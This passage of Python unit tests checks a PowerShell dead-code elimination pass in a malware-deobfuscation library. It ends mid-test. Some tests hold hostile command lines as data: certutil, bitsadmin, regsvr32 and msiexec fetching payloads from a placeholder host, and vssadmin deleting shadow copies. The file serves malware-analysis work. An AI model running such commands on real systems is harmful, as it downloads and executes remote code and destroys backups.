from __future__ import annotations

from inspect import cleandoc

from test import opportunity
from test.lib.scripts.ps1.deobfuscation import TestPs1

from refinery.lib.scripts.pipeline import PipelineObserver, TransformerGroup
from refinery.lib.scripts.ps1.deobfuscation import (
    Ps1DeadCodeElimination,
    Ps1JunkStatementRemoval,
)
from refinery.lib.scripts.ps1.parser import Ps1Parser


class TestPs1DeadCodeElimination(TestPs1):

    def test_while_false_removed(self):
        result = self._deobfuscate("while ($False) { Write-Host 'dead' }; Write-Host 'live'")
        self.assertNotIn('dead', result)
        self.assertIn('live', result)

    def test_if_true_keeps_then(self):
        result = self._deobfuscate("if ($True) { Write-Host 'yes' } else { Write-Host 'no' }")
        self.assertIn('yes', result)
        self.assertNotIn("'no'", result)

    def test_if_false_keeps_else(self):
        result = self._deobfuscate("if ($False) { Write-Host 'a' } else { Write-Host 'b' }")
        self.assertNotIn("'a'", result)
        self.assertIn('b', result)

    def test_if_false_then_true_elseif_keeps_only_the_elseif_body(self):
        result = self._deobfuscate("if ($False) {} elseif ($True) { Write-Host 'second' }")
        self.assertEqual(result, "Write-Host 'second'")

    def test_all_false_keeps_else(self):
        result = self._deobfuscate("if ($False) {} elseif ($False) {} else { Write-Host 'else' }")
        self.assertEqual(result, "Write-Host 'else'")

    def test_non_static_stops_pruning(self):
        result = self._deobfuscate("$x = $env:V\nif ($False) {} elseif ($x) { Write-Host 'kept' }")
        self.assertNotIn('$False', result)
        self.assertIn('$x', result)
        self.assertIn('kept', result)

    def test_switch_constant_match(self):
        result = self._deobfuscate("switch (5) { 3 { 'a' } 5 { 'b' } default { 'c' } }")
        self.assertIn('b', result)
        self.assertNotIn("'a'", result)
        self.assertNotIn("'c'", result)

    def test_the_clause_a_switch_over_a_constant_runs_keeps_the_value_it_runs_for(self):
        source = "switch ('abc') { 'abc' { Write-Host $_ } }"
        self._assertDeobfuscatesToOneOf(source, source, "Write-Host 'abc'")

    def test_the_clause_keeps_the_value_a_function_it_calls_reads(self):
        source = """
            function Show-Item { Write-Output "item=$_" }
            switch ('abc') { 'abc' { Show-Item } }
        """
        self._assertDeobfuscatesToOneOf(source, source, "Write-Output 'item=abc'")

    def test_the_clause_folds_where_a_pipeline_in_it_binds_its_own_value(self):
        self._assertDeobfuscatesTo(
            "switch ('abc') { 'abc' { 1, 2 | ForEach-Object { Write-Host $_ } } }",
            '1, 2 | ForEach-Object { Write-Host $_ }',
        )

    def test_switch_constant_default(self):
        result = self._deobfuscate("switch (99) { 1 { 'a' } default { 'd' } }")
        self.assertIn('d', result)
        self.assertNotIn("'a'", result)

    def test_switch_constant_no_match(self):
        result = self._deobfuscate("switch (99) { 1 { 'a' } 2 { 'b' } }")
        self.assertNotIn("'a'", result)
        self.assertNotIn("'b'", result)

    def test_do_while_false_executes_once(self):
        result = self._deobfuscate("do { Write-Host 'once' } while ($False)")
        self.assertIn('once', result)
        self.assertNotIn('while', result.lower())

    def test_if_false_no_else_removed(self):
        result = self._deobfuscate("if ($False) { Write-Host 'dead' }")
        self.assertNotIn('dead', result)

    def test_if_true_empty_then(self):
        result = self._deobfuscate("if ($True) {} else { Write-Host 'dead' }")
        self.assertNotIn('dead', result)

    def test_if_nonzero_integer_truthy(self):
        result = self._deobfuscate("if (99) { Write-Host 'yes' } else { Write-Host 'no' }")
        self.assertIn('yes', result)
        self.assertNotIn("'no'", result)

    def test_if_zero_integer_falsy(self):
        result = self._deobfuscate("if (0) { Write-Host 'dead' } else { Write-Host 'live' }")
        self.assertNotIn('dead', result)
        self.assertIn('live', result)

    def test_while_zero_removed(self):
        result = self._deobfuscate("while (0) { Write-Host 'dead' }; Write-Host 'live'")
        self.assertNotIn('dead', result)
        self.assertIn('live', result)

    def test_if_nonempty_string_truthy(self):
        result = self._deobfuscate("if ('x') { Write-Host 'yes' }")
        self.assertIn('yes', result)
        self.assertNotIn('if', result.lower().split('write')[0])

    def test_if_empty_string_falsy(self):
        result = self._deobfuscate("if ('') { Write-Host 'dead' }")
        self.assertNotIn('dead', result)

    def test_if_negative_integer_truthy(self):
        result = self._deobfuscate("if (-12) { Write-Host 'yes' }")
        self.assertIn('yes', result)
        self.assertNotIn('-12', result)

    def test_if_null_falsy(self):
        result = self._deobfuscate("if ($Null) { Write-Host 'dead' }")
        self.assertNotIn('dead', result)

    def test_if_zero_real_falsy(self):
        result = self._deobfuscate("if (0.0) { Write-Host 'dead' }")
        self.assertNotIn('dead', result)

    def test_if_nonzero_real_truthy(self):
        result = self._deobfuscate("if (3.14) { Write-Host 'yes' }")
        self.assertIn('yes', result)
        self.assertNotIn('3.14', result)

    def test_dead_for_loop_false_eq(self):
        result = self._deobfuscate(
            "for($x=175;$x-Eq437;$x++){Write-Host 'hi'}")
        self.assertIn('$x', result)
        self.assertIn('175', result)
        self.assertNotIn('for', result.lower())
        self.assertNotIn('Write-Host', result)

    def test_a_for_loop_whose_condition_holds_at_entry_still_prints(self):
        result = self._deobfuscate(
            "for($x=10;$x-Eq10;$x++){Write-Host 'hi'}")
        self.assertIn("Write-Host 'hi'", result)

    def test_dead_for_loop_no_initializer(self):
        result = self._deobfuscate(
            "for(;$False;){Write-Host 'hi'}")
        self.assertNotIn('Write-Host', result)

    def test_for_break_unrolled(self):
        result = self._deobfuscate(
            "for($i=0;$i -lt 10;$i++){$x = 1; $y = 2; break}")
        self.assertNotIn('for', result.lower())
        self.assertNotIn('break', result.lower())
        self.assertIn('$x', result)
        self.assertIn('$y', result)
        self.assertIn('$i', result)

    def test_for_break_labeled_preserved(self):
        result = self._deobfuscate(
            ":outer for($i=0;$i -lt 5;$i++){$x = 1; break :outer}")
        self.assertIn('for', result.lower())

    def test_for_break_unreachable_tail_removed(self):
        result = self._deobfuscate(
            'for($i=0;$i -lt 5;$i++){break; Write-Host done}')
        self.assertEqual(result, '$i = 0')

    def test_for_break_only(self):
        result = self._deobfuscate(
            "for($i=0;$i -lt 5;$i++){break}")
        self.assertNotIn('for', result.lower())
        self.assertIn('$i', result)

    def test_while_break_unrolled(self):
        result = self._deobfuscate(
            "while($True){$x = 42; break}")
        self.assertNotIn('while', result.lower())
        self.assertNotIn('break', result.lower())
        self.assertIn('42', result)

    def test_do_while_break_unrolled(self):
        result = self._deobfuscate(
            "do{$x = 42; break}while($True)")
        self.assertNotIn('do', result.lower())
        self.assertNotIn('break', result.lower())
        self.assertIn('42', result)

    def test_do_until_break_unrolled(self):
        result = self._deobfuscate(
            "do{$x = 42; break}until($False)")
        self.assertNotIn('until', result.lower())
        self.assertNotIn('break', result.lower())
        self.assertIn('42', result)

    def test_while_break_false_condition_removed(self):
        result = self._deobfuscate_iterative(
            "while($False){$x = 42; break}")
        self.assertNotIn('42', result)

    def test_while_break_unknown_condition_guarded(self):
        result = self._deobfuscate(
            "while(Get-Random){Write-Host 42; break}")
        self.assertNotIn('while', result.lower())
        self.assertNotIn('break', result.lower())
        self.assertIn('if', result.lower())
        self.assertIn('42', result)

    def test_for_break_false_condition_preserves_init(self):
        result = self._deobfuscate_iterative(
            "for($i=0; $False; $i++){$x = 42; break}")
        self.assertNotIn('42', result)
        self.assertIn('$i', result)

    def test_while_dead_loop_no_incorrect_inline(self):
        result = self._deobfuscate_iterative(
            '$a = 10\n'
            'while((-9 + $a) -GE (44)) { $b = $a; break }\n'
            '$c = $b - 200\n'
            '$d = [Char][int]$c'
        )
        self.assertNotIn('190', result)

    def test_bare_integer_statements_are_not_this_passs_to_drop(self):
        result = self._apply(
            '$x = Get-Process\n'
            '42\n'
            'Write-Host $x\n'
            '(-7)\n',
            Ps1DeadCodeElimination,
        )
        self.assertIn('42', result)
        self.assertIn('-7', result)
        self.assertIn('Get-Process', result)

    def test_bare_integer_only_script_preserved(self):
        result = self._deobfuscate('42')
        self.assertIn('42', result)

    def test_string_statement_preserved(self):
        result = self._deobfuscate_iterative(
            '$x = Get-Process\n'
            "'hello'\n"
            'Write-Host $x\n',
            remove_junk=False,
        )
        self.assertIn('hello', result)

    def test_a_constant_in_a_switch_case_is_not_this_passs_to_drop(self):
        result = self._apply(
            'switch ($action) {\n'
            '  1 { 99 }\n'
            '  2 { Write-Host "ok" }\n'
            '}\n',
            Ps1DeadCodeElimination,
        )
        self.assertIn('99', result)
        self.assertIn('Write-Host', result)

    def test_a_constant_in_a_subexpression_is_kept_or_expanded_into_the_string(self):
        source = '"prefix$( 1 + 2 )suffix"'
        self._assertDeobfuscatesToOneOf(source, source, "'prefix3suffix'")

    def test_scriptblock_body_constant_preserved(self):
        result = self._deobfuscate('$x = & { $True }')
        self.assertIn('$True', result)

    def test_scriptblock_body_numeric_preserved(self):
        result = self._deobfuscate('$x = & { 42 }')
        self.assertIn('42', result)


class TestPs1DeadCodeExtra(TestPs1):

    def test_value_producing_if_assignment_keeps_branches(self):
        result = self._apply(
            "$x = if ($c) { 'aaa' } else { 'bbb' }",
            Ps1DeadCodeElimination, Ps1JunkStatementRemoval)
        self.assertEqual(result, cleandoc("""
            $x = if ($c) {
              'aaa'
            } else {
              'bbb'
            }
        """))

    def test_switch_executes_all_matching_clauses(self):
        result = self._apply(
            "switch (1) { 1 { Write-Host 'A' } 1 { Write-Host 'B' } }", Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc("""
            Write-Host 'A'
            Write-Host 'B'
        """))

    def test_switch_case_sensitive_match(self):
        result = self._apply(
            "switch -CaseSensitive ('Foo') { 'foo' { Write-Host 'A' } 'Foo' { Write-Host 'B' } }",
            Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'B'")

    def test_empty_try_catch_removed(self):
        result = self._apply('try {} catch {}', Ps1DeadCodeElimination)
        self.assertEqual(result, '')

    def test_empty_try_catch_finally_hoists_finally(self):
        result = self._apply(
            "try {} catch {} finally { Write-Host 'f' }", Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'f'")

    def test_nonempty_try_kept(self):
        result = self._apply(
            "try { Get-Item x } catch { Write-Host 'err' }", Ps1DeadCodeElimination)
        self.assertEqual(result, "try {\n  Get-Item x\n} catch {\n  Write-Host 'err'\n}")

    def test_trap_continue_removed(self):
        result = self._apply('trap { continue }', Ps1DeadCodeElimination)
        self.assertEqual(result, '')

    def test_trap_break_removed(self):
        result = self._apply('trap { break }', Ps1DeadCodeElimination)
        self.assertEqual(result, '')

    def test_trap_empty_removed(self):
        result = self._apply('trap {}', Ps1DeadCodeElimination)
        self.assertEqual(result, '')

    def test_trap_typed_empty_removed(self):
        result = self._apply('trap [Exception] { continue }', Ps1DeadCodeElimination)
        self.assertEqual(result, '')

    @opportunity
    def test_a_trap_with_output_that_guards_nothing_is_removed(self):
        result = self._apply("trap { Write-Host 'log' }", Ps1DeadCodeElimination)
        self.assertEqual(result, '')

    @opportunity
    def test_a_trap_with_a_labeled_break_that_guards_nothing_is_removed(self):
        result = self._apply('trap { break :outer }', Ps1DeadCodeElimination)
        self.assertEqual(result, '')

    def test_empty_for_counter_terminal(self):
        result = self._apply(
            'for ($i = 0; $i -LT 41; $i++) {}', Ps1DeadCodeElimination)
        self.assertEqual(result, '$i = 41')

    def test_empty_for_decrement_terminal(self):
        result = self._apply(
            'for ($i = 10; $i -GT 0; $i--) {}', Ps1DeadCodeElimination)
        self.assertEqual(result, '$i = 0')

    def test_empty_for_zero_iteration_keeps_init(self):
        result = self._apply(
            'for ($i = 5; $i -LT 0; $i++) {}', Ps1DeadCodeElimination)
        self.assertEqual(result, '$i = 5')

    def test_a_hoisted_for_initializer_does_not_start_printing_its_value(self):
        result = self._apply("for (5; $False; ) { }\nWrite-Host 'go'", Ps1DeadCodeElimination)
        self.assertEqual(result, "$Null = 5\nWrite-Host 'go'")

    def test_empty_for_infinite_kept(self):
        result = self._apply('for (;;) {}', Ps1DeadCodeElimination)
        self.assertIn('for', result.lower())

    def test_empty_for_nonconstant_bound_kept(self):
        result = self._apply(
            'for ($i = 0; $i -LT $n; $i++) {}', Ps1DeadCodeElimination)
        self.assertIn('for', result.lower())

    def test_empty_while_true_kept(self):
        result = self._apply('while ($True) {}', Ps1DeadCodeElimination)
        self.assertIn('while', result.lower())

    def test_function_body_return_value_preserved(self):
        result = self._apply(
            "function f { $Null = 915; 42 }\n$x = f\nWrite-Host $x",
            Ps1DeadCodeElimination)
        self.assertIn('42', result)

    def test_try_bareword_assign_removed(self):
        result = self._apply(
            "try { foo =5 } catch {}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_try_multiple_bareword_assigns_removed(self):
        result = self._apply(
            "try {\n  abc =1\n  def =2\n} catch {}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_try_bareword_with_finally_hoists(self):
        result = self._apply(
            "try { foo =5 } catch {} finally { Write-Host 'f' }", Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'f'")

    def test_a_try_body_that_may_raise_keeps_its_construct(self):
        for body in ('[Math]::Sqrt($d)', '[Int]$d', '1 / $d', '$a[$i]'):
            with self.subTest(body):
                self._assertUnchanged(cleandoc(
                    F"""
                    try {{
                      {body}
                    }} catch {{}}
                    Write-Host 'keep'
                    """
                ), Ps1DeadCodeElimination)

    def test_a_noise_bareword_below_an_open_world_is_kept(self):
        self._assertUnchanged(cleandoc(
            """
            iex $x
            try {
              foo =5
            } catch {}
            Write-Host 'keep'
            """
        ), Ps1DeadCodeElimination)

    def test_a_noise_bareword_above_the_statement_that_opens_the_world_is_removed(self):
        result = self._apply(cleandoc(
            """
            try {
              foo =5
            } catch {}
            iex $x
            Write-Host 'keep'
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, "iex $x\nWrite-Host 'keep'")

    def test_try_function_return_value_preserved(self):
        result = self._apply(
            'function f { try { 42 } catch {} }', Ps1DeadCodeElimination)
        self.assertEqual(result, 'function f {\n  42\n}')

    def test_try_side_effect_command_kept(self):
        result = self._apply(
            "try { Remove-Item foo } catch {}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
        self.assertIn('Remove-Item', result)

    def test_try_wrapped_native_binary_kept(self):
        for command in (
            "certutil -urlcache -split -f 'http://host/payload.exe'",
            "bitsadmin /transfer j 'http://host/p.exe' C:\\p.exe",
            "regsvr32 /s /u /i:http://host/f.sct scrobj.dll",
            "wmic process call create 'calc.exe'",
            'vssadmin delete shadows /all /quiet',
        ):
            with self.subTest(command):
                result = self._apply(
                    F"try {{ {command} }} catch {{}}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
                self.assertIn(command.split()[0], result)

    def test_try_nonempty_catch_kept(self):
        result = self._apply(
            "try { foo =5 } catch { Write-Host 'err' }\nWrite-Host 'keep'",
            Ps1DeadCodeElimination)
        self.assertIn('foo', result)
        self.assertIn('err', result)

    def test_try_path_command_kept(self):
        result = self._apply(
            "try { ./script.ps1 } catch {}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
        self.assertIn('script', result)

    def test_try_exe_command_kept(self):
        result = self._apply(
            "try { notepad.exe } catch {}\nWrite-Host 'keep'", Ps1DeadCodeElimination)
        self.assertIn('notepad', result)

    def test_function_return_value_not_dropped_when_dead_if_pruned(self):
        result = self._apply(
            'function f { if ($False) {} 42 }',
            Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            function f {
              42
            }
            """
        ))

    def test_do_while_false_break_does_not_retarget_outer_loop(self):
        result = self._apply(
            "while ($outer) { do { $x = 1; break } while ($False); $z = 2 }",
            Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            while ($outer) {
              $x = 1
              $z = 2
            }
            """
        ))

    def test_do_while_false_continue_does_not_retarget_outer_loop(self):
        code = cleandoc(
            """
            while ($outer) {
              do {
                $x = 1
                continue
              } while ($False)
              $z = 2
            }
            """
        )
        self.assertIn(self._apply(code, Ps1DeadCodeElimination), (code, cleandoc(
            """
            while ($outer) {
              $x = 1
              $z = 2
            }
            """
        )))

    @opportunity
    def test_do_while_false_continue_ends_the_do_like_a_break(self):
        result = self._apply(
            'while ($outer) { do { $x = 1; continue } while ($False); $z = 2 }',
            Ps1DeadCodeElimination,
        )
        self.assertEqual(result, cleandoc(
            """
            while ($outer) {
              $x = 1
              $z = 2
            }
            """
        ))

    def test_trap_with_inert_body_removed(self):
        result = self._apply(
            "trap { continue }\nWrite-Host 'keep'", Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'keep'")

    def test_function_nested_block_return_value_preserved(self):
        result = self._apply(
            'function f { if ($cond) { 42 } }', Ps1DeadCodeElimination)
        self.assertEqual(result, 'function f {\n  if ($cond) {\n    42\n  }\n}')

    def test_function_return_value_preserved_with_effectful_if(self):
        result = self._apply(
            "function f { if ($cond) { Write-Host 'x' }; 42 }", Ps1DeadCodeElimination)
        self.assertEqual(result, "function f {\n  if ($cond) {\n    Write-Host 'x'\n  }\n  42\n}")

    def test_do_while_nested_break_not_hoisted(self):
        result = self._apply(
            'while ($outer) { do { if ($c) { break } } while ($False); $z = 2 }',
            Ps1DeadCodeElimination)
        self.assertIn('do', result.lower())
        self.assertIn('while ($False)', result)

    def test_body_breaks_unconditionally_rejects_intermediate_break(self):
        result = self._apply(
            'while ($True) { $x = 1; if ($c) { break }; $y = 2; break }',
            Ps1DeadCodeElimination)
        self.assertIn('while', result.lower())


class TestPs1ASwitchIsKeptWhileAJumpInItsClauseLandsOnIt(TestPs1):

    def test_a_continue_nested_in_the_clause_keeps_the_switch(self):
        result = self._apply(cleandoc("""
            foreach ($i in 1..3) {
              switch (1) {
                1 {
                  if ($i -eq 2) {
                    continue
                  }
                  Write-Host $i
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination)
        self.assertIn('switch', result)

    def test_a_break_nested_in_the_clause_keeps_the_switch(self):
        result = self._apply(cleandoc("""
            foreach ($i in 1..3) {
              switch (1) {
                1 {
                  if ($i -eq 2) {
                    break
                  }
                  Write-Host $i
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination)
        self.assertIn('switch', result)

    def test_a_continue_in_a_block_the_clause_runs_keeps_the_switch(self):
        result = self._apply(cleandoc("""
            foreach ($i in 1..3) {
              switch (1) {
                1 {
                  1 | ForEach-Object { continue }
                  Write-Host $i
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination)
        self.assertIn('switch', result)

    def test_a_break_in_a_function_the_clause_calls_keeps_the_switch(self):
        result = self._apply(cleandoc("""
            function f { break }
            foreach ($i in 1..3) {
              switch (1) {
                1 {
                  f
                  Write-Host $i
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination)
        self.assertIn('switch', result)

    def test_a_break_in_code_the_clause_cannot_read_keeps_the_switch(self):
        result = self._apply(cleandoc("""
            foreach ($i in 1..3) {
              switch (1) {
                1 {
                  Invoke-Expression 'break'
                  Write-Host $i
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination)
        self.assertIn('switch', result)

    def test_a_trailing_break_naming_the_loop_around_the_switch_keeps_it(self):
        result = self._apply(cleandoc("""
            :outer foreach ($i in 1..3) {
              switch (1) {
                1 {
                  Write-Host $i
                  break outer
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination)
        self.assertIn('break outer', result)

    def test_a_continue_an_inner_loop_takes_lets_the_switch_go(self):
        self.assertEqual(self._apply(cleandoc("""
            foreach ($i in 1..3) {
              switch (1) {
                1 {
                  foreach ($j in 1..2) {
                    if ($j -eq 1) {
                      continue
                    }
                    Write-Host $j
                  }
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination), cleandoc("""
            foreach ($i in 1..3) {
              foreach ($j in 1..2) {
                if ($j -eq 1) {
                  continue
                }
                Write-Host $j
              }
              Write-Host 'x'
            }
        """))

    def test_a_trailing_break_without_a_label_lets_the_switch_go(self):
        self.assertEqual(self._apply(cleandoc("""
            foreach ($i in 1..3) {
              switch (1) {
                1 {
                  Write-Host $i
                  break
                }
              }
              Write-Host 'x'
            }
        """), Ps1DeadCodeElimination), cleandoc("""
            foreach ($i in 1..3) {
              Write-Host $i
              Write-Host 'x'
            }
        """))


class TestPs1UnreachableStatementRemoval(TestPs1):

    def test_a_statement_after_a_return_is_removed(self):
        result = self._apply(cleandoc(
            """
            function f {
              Write-Host 'before'
              return 1
              Write-Host 'after'
            }
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            function f {
              Write-Host 'before'
              return 1
            }
            """
        ))

    def test_a_statement_after_a_throw_is_removed(self):
        result = self._apply(cleandoc(
            """
            Write-Host 'before'
            throw 'boom'
            Write-Host 'after'
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            Write-Host 'before'
            throw 'boom'
            """
        ))

    def test_a_statement_after_a_throw_is_kept_where_errors_silently_continue(self):
        self._assertUnchanged(cleandoc(
            """
            $ErrorActionPreference = 'SilentlyContinue'
            throw 'boom'
            Write-Host 'after'
            """
        ), Ps1DeadCodeElimination)

    def test_a_try_after_a_throw_is_removed_with_its_handler(self):
        result = self._apply(cleandoc(
            """
            Write-Host 'before'
            throw 'boom'
            try {
              Write-Host 'x'
            } catch {
              Write-Host 'c'
            }
            Write-Host 'after'
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            Write-Host 'before'
            throw 'boom'
            """
        ))

    def test_a_for_loop_after_a_throw_is_removed(self):
        result = self._apply(cleandoc(
            """
            Write-Host 'before'
            throw 'boom'
            for ($i = 0; $i -lt 3; $i++) {
              trap {
                Write-Host 'h'
              }
            }
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            Write-Host 'before'
            throw 'boom'
            """
        ))

    def test_a_try_that_a_resolved_branch_leaves_behind_a_throw_is_removed(self):
        result = self._apply(cleandoc(
            """
            Write-Host 'before'
            if ($True) {
              throw 'boom'
            }
            try {
              if ($True) {
                try {
                  return
                  trap {
                    Write-Host 'h'
                  }
                } catch {
                  Write-Host 'c'
                }
              }
            } catch {}
            Write-Host 'after'
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            Write-Host 'before'
            throw 'boom'
            """
        ))

    def test_an_empty_try_after_a_statement_that_completes_keeps_its_handler(self):
        self._assertUnchanged(cleandoc(
            """
            Write-Host 'a'
            try {} catch {
              Start-Process calc
            }
            """
        ), Ps1DeadCodeElimination)

    def test_a_finally_body_survives_the_return_that_leaves_its_try(self):
        result = self._apply(cleandoc(
            """
            function f {
              try {
                return 1
                Write-Host 'dead'
              } finally {
                Write-Host 'always'
              }
            }
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            function f {
              try {
                return 1
              } finally {
                Write-Host 'always'
              }
            }
            """
        ))

    def test_a_trap_intercepting_a_reachable_throw_is_kept(self):
        self._assertUnchanged(cleandoc(
            """
            trap {
              continue
            }
            throw 'e'
            Write-Host 'after'
            """
        ), Ps1DeadCodeElimination)


class TestPs1ALoopWhoseBodyCannotRunTwiceRunsItOnce(TestPs1):

    def test_a_loop_whose_break_stands_behind_a_return_runs_its_body_once(self):
        result = self._apply(cleandoc(
            """
            while ($True) {
              if ($False) {
                continue
              }
              return
              break
            }
            Write-Host 'end'
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, 'return')

    def test_a_loop_whose_break_stands_behind_a_throw_a_resolved_branch_left_runs_its_body_once(self):
        result = self._apply(cleandoc(
            """
            while ($True) {
              if ($True) {
                throw 'x'
                foreach ($i in 1..2) {
                  trap {
                    continue
                  }
                }
              }
              break
            }
            Write-Host 'end'
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, "throw 'x'")

    def test_a_body_ending_in_a_return_under_a_condition_becomes_a_branch(self):
        result = self._apply(cleandoc(
            """
            while ($c) {
              Write-Host 'a'
              return
            }
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            if ($c) {
              Write-Host 'a'
              return
            }
            """
        ))

    def test_a_do_loop_whose_body_ends_in_exit_runs_it_once(self):
        result = self._apply(cleandoc(
            """
            do {
              Write-Host 'a'
              exit
            } while ($c)
            Write-Host 'end'
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, "Write-Host 'a'\nexit")

    def test_a_continue_that_may_start_another_run_keeps_the_loop(self):
        self._assertUnchanged(cleandoc(
            """
            while ($True) {
              if ($c) {
                continue
              }
              return
            }
            """
        ), Ps1DeadCodeElimination)

    def test_a_break_in_a_function_the_body_calls_keeps_the_loop(self):
        result = self._apply(cleandoc(
            """
            function f { break }
            foreach ($i in 1..3) {
              while ($True) {
                f
                Write-Host $i
                break
              }
              Write-Host 'x'
            }
            """
        ), Ps1DeadCodeElimination)
        self.assertIn('while ($True)', result)

    def test_a_continue_in_a_block_the_body_runs_keeps_a_do_loop_that_never_repeats(self):
        result = self._apply(cleandoc(
            """
            $sb = { continue }
            foreach ($i in 1..3) {
              do {
                & $sb
                Write-Host $i
              } while ($False)
              Write-Host 'x'
            }
            """
        ), Ps1DeadCodeElimination)
        self.assertIn('while ($False)', result)

    def test_a_break_an_inner_loop_takes_does_not_keep_the_loop(self):
        result = self._apply(cleandoc(
            """
            do {
              foreach ($x in $items) {
                break
              }
              Write-Host 'a'
            } while ($False)
            """
        ), Ps1DeadCodeElimination)
        self.assertEqual(result, cleandoc(
            """
            foreach ($x in $items) {
              break
            }
            Write-Host 'a'
            """
        ))

    def test_a_resuming_trap_that_carries_control_past_the_last_throw_keeps_the_loop(self):
        self._assertUnchanged(cleandoc(
            """
            while ($True) {
              if ($c) {
                trap {
                  continue
                }
                throw 'x'
              } else {
                return
              }
            }
            """
        ), Ps1DeadCodeElimination)


class TestPs1ADeadCodeVisitLeavesNothingForTheNext(TestPs1):

    _SCRIPTS = (
        "while ($True) { if ($False) { continue }; return; break }\nWrite-Host 'end'",
        "if ($True) { throw 'e' }\ntry { if ($True) { try { return } catch { 'c' } } } catch {}",
        'trap { continue }\nforeach ($i in 1..2) { trap { continue }; $null = 1/$z }',
    )

    def test_a_second_visit_changes_nothing(self):
        for source in self._SCRIPTS:
            with self.subTest(source=source):
                script = Ps1Parser(source).parse()
                first = Ps1DeadCodeElimination()
                first.visit(script)
                self.assertTrue(first.changed)
                second = Ps1DeadCodeElimination()
                second.visit(script)
                self.assertFalse(second.changed)

    def test_a_group_holding_the_pass_runs_it_once_on_a_script_one_visit_settles(self):
        visits: list[str] = []

        class Count(PipelineObserver):
            def before(self, group, transformer, ast):
                visits.append(transformer.__name__)

        for source in self._SCRIPTS:
            with self.subTest(source=source):
                visits.clear()
                script = Ps1Parser(source).parse()
                TransformerGroup('prune', Ps1DeadCodeElimination).run(script, observer=Count())
                self.assertEqual(visits, ['Ps1DeadCodeElimination'])


class TestPs1ATryWhoseBodyCannotRaiseDissolvesWhateverItsHandlerTakes(TestPs1):

    def test_a_constant_body_under_a_catch_that_cannot_match_dissolves(self):
        self.assertEqual(
            self._apply('try { 5 } catch [System.IO.IOException] {}', Ps1DeadCodeElimination),
            '5')

    def test_an_empty_body_under_a_catch_that_cannot_match_dissolves(self):
        self.assertEqual(
            self._apply('try {} catch [System.IO.IOException] {}', Ps1DeadCodeElimination),
            '')

    def test_a_constant_body_with_no_catch_at_all_hoists_its_finally(self):
        self.assertEqual(
            self._apply("try { 5 } finally { Write-Host 'f' }", Ps1DeadCodeElimination),
            "5\nWrite-Host 'f'")


class TestPs1InjectedNoiseBareword(TestPs1):

    def test_an_assignment_residue_is_dropped(self):
        for source in ('0042DsKaho=8602057', 'Zbc =1', 'aQ=2'):
            with self.subTest(source):
                result = self._apply(
                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
                    Ps1DeadCodeElimination)
                self.assertEqual(result, "Write-Host 'keep'")

    def test_a_native_command_line_survives_an_equals_argument(self):
        for source in (
            'certutil -urlcache -split -f =http://host/payload.exe',
            'findstr /c:x =y C:\\log.txt',
            'reg add HKCU\\Software\\X /v Y /t REG_SZ /d =Z',
            'setx EVILVAR =1',
        ):
            with self.subTest(source):
                result = self._apply(
                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
                    Ps1DeadCodeElimination)
                self.assertIn('try', result)


class TestPs1NoiseBarewordSpellings(TestPs1):

    def test_a_quoted_argument_is_not_assignment_residue(self):
        for source in (
            "certutil '=http://host/payload.exe'",
            'certutil "=http://host/payload.exe"',
        ):
            with self.subTest(source):
                result = self._apply(
                    F"try {{ {source} }} catch {{ }}\nWrite-Host 'keep'",
                    Ps1DeadCodeElimination)
                self.assertIn('try', result)

    def test_a_call_operator_is_not_assignment_residue(self):
        result = self._apply(
            "try { & msiexec =http://host/p.msi } catch { }\nWrite-Host 'keep'",
            Ps1DeadCodeElimination)
        self.assertIn('try', result)


class TestPs1DeadCodeLeavesTheTreeConsistent(TestPs1):
    def test_a_construct_pruned_to_nothing_inside_a_protected_body(self):
        self._assertTreeIsIntact(cleandoc(
            """
            try {
              for (5; $False; ) { }
            } catch {
              Write-Host 'oops'
            }
            Write-Host 'go'
            """
        ), cleandoc(
            """
            try {
              $Null = 5
            } catch {
              Write-Host 'oops'
            }
            Write-Host 'go'
            """
        ), Ps1DeadCodeElimination)

    def test_a_construct_with_an_update_pruned_to_nothing(self):
        self._assertTreeIsIntact(cleandoc(
            """
            try {
              for (5; $False; 6) { }
            } catch {
              Write-Host 'oops'
            }
            """
        ), cleandoc(
            """
            try {
              $Null = 5
            } catch {
              Write-Host 'oops'
            }
            """
        ), Ps1DeadCodeElimination)

    def test_a_construct_pruned_to_nothing_beside_a_nested_handler(self):
        self._assertTreeIsIntact(cleandoc(
            """
            try {
              try {
                for (5; $False; ) { }
              } catch {
                Write-Host 'in'
              }
            } catch {
              Write-Host 'out'
            }
